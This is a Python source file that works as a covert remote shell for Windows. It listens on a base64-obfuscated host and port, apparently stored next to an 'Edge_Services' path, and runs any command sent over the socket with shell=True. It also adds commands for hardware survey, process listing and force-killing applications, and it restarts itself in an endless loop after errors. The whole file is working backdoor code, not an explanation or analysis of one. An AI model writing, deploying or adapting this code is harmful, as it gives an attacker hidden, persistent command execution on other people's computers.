import socket, os
import subprocess
import base64
try:
    installed_mods = True
    import psutil
    import GPUtil
except:
    installed_mods = False
    pass


def get_hardware():
    RAM = psutil.virtual_memory().total
    DISK = psutil.disk_partitions(all=True)
    GPU = GPUtil.getGPUs()[0]
    GPUName = GPU.name
    GPUMemory = GPU.memoryFree
    GPU = GPUName + " ram:" + str(GPUMemory)
    return (RAM, DISK, GPU)

def list_running_apps():
    apps = []
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            proc_info = proc.info
            apps.append(f"PID: {proc_info['pid']}, Name: {proc_info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return apps


def close_app_by_name(app_name):
    try:
        subprocess.run(f"TASKKILL /F /IM {app_name}")
        return f"Killed {app_name} "
    except:
        return "Failed "


def get_path(main_string: str):
    index = main_string.find("cd ")
    if index != -1:
        start_index = index + len("cd ")
        extracted_substring = main_string[start_index:]
        return extracted_substring.strip()
    else:
        return None
    

def last_index(string : str, LastChar : str = "\\"):
    for index, char in enumerate(string[::-1]):
        if char == LastChar:
            index = index
            break
    return len(string)-index-1


def first_index(string : str, matches = 1, LastChar : str = '\\'):
    indexs = []
    for index, char in enumerate(string):
        if char == LastChar and len(indexs) < matches:
            indexs.append(index)
        elif len(indexs) > matches:
            break
    
    return indexs[-1]

index = first_index(os.path.dirname(os.path.abspath(__file__)), 3)
filedir = os.getcwd()[:index] + "\\Edge_Services\\Dpath.txt"

f = open(f"{filedir}", "r")
Original_path = f.read()
f.close()


class RunCommand:


    class RunCustomCommand:

        def run(command):
            if command[2:10] == "hardware":
                return RunCommand.RunCustomCommand.hardware(command), 1

            elif command[2:6] == "apps" and installed_mods == True:
                return RunCommand.RunCustomCommand.apps(), 2
            
            elif command[2:7] == "close" and installed_mods == True:
                return RunCommand.RunCustomCommand.close(command), 3
            
            else:
                return "Invalid Command ", 0

        
        def hardware(command):
            try:
                output = get_hardware()
                return output
            except:
                output = "Ran Into An Error When Getting Hardware :-( "
                return output
            
        def apps():
            try:
                output = list_running_apps()
                return output
            except:
                output = "Ran Into An Error When Getting Apps :-( "
                return output
    
        def close(command):
            output = close_app_by_name(command[7:])
            return output
        

    def cd(command, path):

        oldpath = path

        if get_path(command)[:3] == "C:\\":
                path = (get_path(command))

        elif get_path(command)[:2] == "..":
            lastIndex = last_index(path)
            path = (path[:lastIndex])

        else:
            path = (path + "\\" + get_path(command))


        if os.path.isdir(path):
            completed_process = subprocess.run("cd", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True, cwd=path)
            return completed_process, path
        else:
            completed_process = subprocess.run(f"echo Invalid Path {path}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True)
            return completed_process, oldpath
        
    

def main():
    global path, Original_path


    HOST = base64.b64decode(b'MTkyLjE2OC4yLjEx').decode()  # Don't bother decodeing this its a waste of time (trust me bro)
    PORT = int(base64.b64decode(b'ODAwMA==').decode())  # This is useless to decode

    path = Original_path

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    
    client_socket, _ = server_socket.accept()
    client_socket.send(f"Connetion Succesfull!, psutil: {installed_mods}\n".encode('utf-8'))


    def run(command):
        global path
        
        if command[:3] == "cd ":
            completed_process, path = RunCommand.cd(command, path)

        elif command[:2] == "$ ":
            output, command_run = RunCommand.RunCustomCommand.run(command)

        else:
            completed_process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True, cwd=path)

        try: 
            _ = output
            if output != "Failed":
                if command_run == 1:
                    output = f"Total Ram: {output[0]}\nDisk Stuff: {output[1]}\nGPU Stuff:{output[2]}"

                elif command_run == 2:
                    outputstr = ""
                    for app in output:
                        outputstr += app
                    output = outputstr

                elif command_run == 3:
                    pass

                elif command_run == 0:
                    pass
            return (output, "\n")
        
        except NameError:
            try:
                output = completed_process.stdout
                error = "\n" + completed_process.stderr
                return (output, error)
            
            except:
                text = base64.b64decode('U2hpdCBSZWFsbHkgSGl0IFRoZSBGYW4gTm93').decode() # This Has a Bad Word In It 😱
                return (text, "\n ")
        
    while True:      
        data = client_socket.recv(524288).decode('utf-8')
        

        if not data:
            output, error = ("", "")
            break

        elif data[:6] == "exit()":
            break

        else:
            output, error = run(data)

        response = output + error
        client_socket.send(response.encode('utf-8'))

    client_socket.close()
    server_socket.close()

main()

while True:
    try:
        main()
    except:
        pass